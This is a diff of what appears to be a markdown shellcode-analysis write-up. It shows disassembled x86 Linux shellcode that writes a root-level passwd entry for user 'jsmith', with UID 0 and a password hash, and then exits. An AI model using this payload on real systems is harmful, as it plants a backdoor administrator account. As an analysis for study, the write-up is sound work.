@@ -101,14 +101,20 @@ The next part will write the _`jsmith:Az.TOSrgrM6ro:0:0::/:/bin/sh\n`_ string to
 0000004B  2F                das
 0000004C  7368              jnc 0xb6
 0000004E  0A. |--> String ends here
+```
+
 We then have to disassemble the instructions starting after the end of string (easily done in gdb): 
+```asm
 00000051  51                push ecx
 00000052  FC                cld
 00000053  6A04              push byte +0x4
 00000055  58                pop eax         ; sys_write syscall
 00000056  CD80              int 0x80
 ; write(3, "jsmith:Az.TOSrgrM6ro:0:0::/:/bin"..., 36) = 36
+```
+
 Finally the shellcode calls the exit function to cleanly finish execution: 
+```asm
 00000058  6A01              push byte +0x1
 0000005A  58                pop eax         ; sys_exit syscall
 0000005B  CD80              int 0x80
